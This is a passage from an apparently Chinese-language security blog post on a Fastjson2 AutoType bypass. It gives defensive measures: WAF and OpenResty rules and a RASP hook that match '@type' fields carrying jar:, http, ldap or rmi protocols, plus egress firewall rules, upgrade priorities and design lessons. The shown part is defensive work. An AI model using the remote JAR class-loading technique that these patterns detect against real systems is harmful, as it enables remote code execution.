+</code></pre></div>
+
+<h3>9.4 WAF 规则</h3>
+<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">ModSecurity</span><span class="w"> </span><span class="nx">规则</span><span class="p">:</span><span class="w"> </span><span class="nx">拦截含</span><span class="w"> </span><span class="nx">jar</span><span class="p">:</span><span class="w"> </span><span class="nx">协议的</span><span class="w"> </span><span class="err">@</span><span class="k">type</span>
+<span class="nx">SecRule</span><span class="w"> </span><span class="nx">REQUEST_BODY</span><span class="w"> </span><span class="s">&quot;@rx [\&quot;&#39;]@type[\&quot;&#39;]\s*:\s*[\&quot;&#39;]jar:&quot;</span><span class="w"> </span>\
+<span class="w">    </span><span class="s">&quot;id:100010,phase:2,deny,status:403,\</span>
+<span class="s">    msg:&#39;Fastjson jar: protocol AutoType bypass attempt&#39;,\</span>
+<span class="s">    log,auditlog,severity:CRITICAL&quot;</span>
+
+<span class="err">#</span><span class="w"> </span><span class="nx">拦截所有含</span><span class="w"> </span><span class="err">@</span><span class="k">type</span><span class="w"> </span><span class="nx">的</span><span class="w"> </span><span class="nx">JSON</span><span class="err">（</span><span class="nx">严格模式</span><span class="err">）</span>
+<span class="nx">SecRule</span><span class="w"> </span><span class="nx">REQUEST_BODY</span><span class="w"> </span><span class="s">&quot;@rx [\&quot;&#39;]@type[\&quot;&#39;]\s*:&quot;</span><span class="w"> </span>\
+<span class="w">    </span><span class="s">&quot;id:100011,phase:2,deny,status:403,\</span>
+<span class="s">    msg:&#39;JSON @type field detected&#39;,\</span>
+<span class="s">    log,auditlog,severity:HIGH&quot;</span>
+
+<span class="err">#</span><span class="w"> </span><span class="nx">拦截含远程</span><span class="w"> </span><span class="nx">URL</span><span class="w"> </span><span class="nx">的</span><span class="w"> </span><span class="err">@</span><span class="k">type</span>
+<span class="nx">SecRule</span><span class="w"> </span><span class="nx">REQUEST_BODY</span><span class="w"> </span><span class="s">&quot;@rx [\&quot;&#39;]@type[\&quot;&#39;]\s*:\s*[\&quot;&#39;](https?|jar|ldap|rmi):&quot;</span><span class="w"> </span>\
+<span class="w">    </span><span class="s">&quot;id:100012,phase:2,deny,status:403,\</span>
+<span class="s">    msg:&#39;Remote protocol in @type field&#39;,\</span>
+<span class="s">    log,auditlog,severity:CRITICAL&quot;</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="c1">-- OpenResty WAF 规则</span>
+<span class="kd">local</span><span class="w"> </span><span class="nv">body</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">ngx</span><span class="p">.</span><span class="py">req</span><span class="p">.</span><span class="nf">get_body_data</span><span class="p">()</span>
+<span class="kr">if</span><span class="w"> </span><span class="nv">body</span><span class="w"> </span><span class="kr">then</span>
+<span class="w">    </span><span class="c1">-- 检测 @type 字段</span>
+<span class="w">    </span><span class="kr">if</span><span class="w"> </span><span class="nv">body</span><span class="p">:</span><span class="nf">match</span><span class="p">(</span><span class="s1">&#39;&quot;@type&quot;%s*:%s*&quot;&#39;</span><span class="p">)</span><span class="w"> </span><span class="kr">then</span>
+<span class="w">        </span><span class="c1">-- 检测危险协议</span>
+<span class="w">        </span><span class="kr">if</span><span class="w"> </span><span class="nv">body</span><span class="p">:</span><span class="nf">match</span><span class="p">(</span><span class="s1">&#39;&quot;@type&quot;%s*:%s*&quot;(jar:|http:|https:|ldap:|rmi:)&#39;</span><span class="p">)</span><span class="w"> </span><span class="kr">then</span>
+<span class="w">            </span><span class="nv">ngx</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nv">ngx</span><span class="p">.</span><span class="py">WARN</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Fastjson AutoType bypass attempt detected&quot;</span><span class="p">)</span>
+<span class="w">            </span><span class="nv">ngx</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
+<span class="w">        </span><span class="kr">end</span>
+<span class="w">    </span><span class="kr">end</span>
+<span class="kr">end</span>
+</code></pre></div>
+
+<h3>9.5 RASP 运行时防护</h3>
+<p>通过 RASP（Runtime Application Self-Protection）在运行时拦截危险类加载：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// RASP 钩子: 拦截 Class.forName 的危险调用</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ClassForNameHook</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">checkBefore</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">className</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">initialize</span><span class="p">,</span>
+<span class="w">                                    </span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">loader</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">className</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span>
+<span class="w">            </span><span class="n">className</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;jar:&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span>
+<span class="w">            </span><span class="n">className</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;http:&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span>
+<span class="w">            </span><span class="n">className</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;https:&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecurityException</span><span class="p">(</span>
+<span class="w">                </span><span class="s">&quot;Blocked remote class loading: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">className</span>
+<span class="w">            </span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>9.6 防御措施优先级</h3>
+<table>
+<thead>
+<tr>
+<th>优先级</th>
+<th>措施</th>
+<th>效果</th>
+<th>实施难度</th>
+<th>业务影响</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>P0</td>
+<td>升级 Fastjson2 2.0.63+</td>
+<td>修复漏洞</td>
+<td>低</td>
+<td>无</td>
+</tr>
+<tr>
+<td>P0</td>
+<td>升级 Fastjson 1.x 1.2.84+</td>
+<td>修复漏洞</td>
+<td>低</td>
+<td>无</td>
+</tr>
+<tr>
+<td>P1</td>
+<td>开启 SafeMode</td>
+<td>纵深防御</td>
+<td>低</td>
+<td>可能影响多态功能</td>
+</tr>
+<tr>
+<td>P1</td>
+<td>WAF 规则拦截 <code>jar:</code> 协议</td>
+<td>阻断利用</td>
+<td>低</td>
+<td>极小</td>
+</tr>
+<tr>
+<td>P2</td>
+<td>迁移 Jackson/Gson</td>
+<td>根除风险</td>
+<td>高</td>
+<td>需重构代码</td>
+</tr>
+<tr>
+<td>P2</td>
+<td>RASP 运行时防护</td>
+<td>深度防御</td>
+<td>中</td>
+<td>极小</td>
+</tr>
+<tr>
+<td>P3</td>
+<td>禁用出网（网络隔离）</td>
+<td>阻断远程加载</td>
+<td>中</td>
+<td>需评估业务出网需求</td>
+</tr>
+</tbody>
+</table>
+<h3>9.7 网络隔离建议</h3>
+<p>由于该漏洞的 RCE 依赖远程 JAR 下载，<strong>限制应用服务器出网</strong>是最有效的网络层防御：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># iptables 规则: 禁止应用服务器主动出站连接</span>
+<span class="c1"># 仅允许必要的白名单目标</span>
+iptables<span class="w"> </span>-A<span class="w"> </span>OUTPUT<span class="w"> </span>-m<span class="w"> </span>owner<span class="w"> </span>--uid-owner<span class="w"> </span>tomcat<span class="w"> </span>-j<span class="w"> </span>DROP
+<span class="c1"># 允许访问数据库</span>
+iptables<span class="w"> </span>-A<span class="w"> </span>OUTPUT<span class="w"> </span>-m<span class="w"> </span>owner<span class="w"> </span>--uid-owner<span class="w"> </span>tomcat<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-d<span class="w"> </span>DB_IP<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">3306</span><span class="w"> </span>-j<span class="w"> </span>ACCEPT
+<span class="c1"># 允许访问内部 API</span>
+iptables<span class="w"> </span>-A<span class="w"> </span>OUTPUT<span class="w"> </span>-m<span class="w"> </span>owner<span class="w"> </span>--uid-owner<span class="w"> </span>tomcat<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-d<span class="w"> </span>INTERNAL_API_IP<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">8080</span><span class="w"> </span>-j<span class="w"> </span>ACCEPT
+</code></pre></div>
+
+<p>即使存在未知的 AutoType 绕过，无法出网也就无法下载远程恶意 JAR，将 RCE 降级为 DoS 或信息泄露。</p>
+<hr />
+<h2>十、总结与反思</h2>
+<h3>10.1 技术启示</h3>
+<ol>
+<li>
+<p><strong>非加密哈希不应用于安全决策</strong>：FNV-1a 是为哈希表设计的快速哈希函数，不具备抗碰撞性。将其用于安全白名单判断是根本性的设计缺陷。安全敏感场景应使用 SHA-256 等加密哈希，或直接进行字符串明文比对。</p>
+</li>
+<li>
+<p><strong>白名单优于黑名单，但白名单本身也需要校验</strong>：Fastjson2 从黑名单转向白名单是正确方向，但白名单的哈希校验可被碰撞绕过，使其形同虚设。白名单应同时校验哈希和明文。</p>
+</li>
+<li>
+<p><strong>检查过程中的副作用是致命的</strong>：<code>checkAutoType</code> 中的 <code>getResourceAsStream</code> 和 <code>Class.forName</code> 都可能在检查阶段触发类加载，将"检查"变成"执行"。安全检查必须是<strong>纯函数</strong>，不产生任何副作用。</p>
+</li>
+<li>
+<p><strong><code>@type</code> 机制的本质不可修复性</strong>：只要允许用户控制反序列化类型，就存在被绕过的可能。Fastjson 十年的攻防历史证明，修补单个绕过只是打地鼠。终极解决方案是迁移到不默认支持类型自省的 JSON 库。</p>
+</li>
+<li>
+<p><strong>Gadget-free 是最危险的形态</strong>：本漏洞和 CVE-2026-16723 都是 Gadget-free 的——不需要任何第三方依赖，仅用 JDK 内置类即可完成攻击。这意味着攻击面覆盖所有使用受影响版本的应用，而非仅限特定依赖组合。</p>
+</li>
+</ol>
+<h3>10.2 对企业的建议</h3>
+<ol>
+<li><strong>立即排查</strong>：全局搜索项目中是否使用 Fastjson/Fastjson2，确认版本</li>
+<li><strong>优先升级</strong>：升级到修复版本（Fastjson2 2.0.63+，Fastjson 1.x 1.2.84+）</li>
+<li><strong>开启 SafeMode</strong>：作为纵深防御，即使升级后也建议开启</li>
+<li><strong>规划迁移</strong>：制定长期迁移计划，将 Fastjson 替换为 Jackson 或 Gson</li>
+<li><strong>网络隔离</strong>：限制应用服务器出网，降低 RCE 风险</li>
+<li><strong>WAF 覆盖</strong>：部署 WAF 规则拦截 <code>@type</code> 和 <code>jar:</code> 协议</li>
+<li><strong>SCA 扫描</strong>：将 Fastjson 版本检查纳入 CI/CD 的软件成分分析（SCA）流程</li>
+</ol>
+<h3>10.3 对框架设计者的警示</h3>
+<p>Fastjson 的十年漏洞史为所有序列化框架设计者提供了深刻教训：</p>
+<ul>
+<li><strong>安全不是特性，是架构</strong>：<code>@type</code> 自省机制从设计之初就埋下了安全隐患，后续所有的黑名单、白名单、SafeMode 都是打补丁</li>
+<li><strong>最小权限原则</strong>：反序列化框架默认不应允许加载任意类型，需要多态时应由开发者显式声明允许的类型范围</li>
+<li><strong>检查与执行分离</strong>：安全检查代码路径中绝不能包含可能导致代码执行的 API 调用</li>
+<li><strong>加密学正确使用</strong>：了解加密哈希与非加密哈希的区别，在安全场景使用正确的工具</li>
+</ul>
+<hr />
+<h2>免责声明</h2>
+<p>本文仅供安全研究和技术学习使用，文中涉及的漏洞分析、PoC代码和攻击技术仅用于授权测试和安全防御建设。读者应遵守所在地区的法律法规，未经授权不得对任何系统进行渗透测试或攻击。因不当使用本文内容所造成的任何后果，作者不承担任何责任。</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
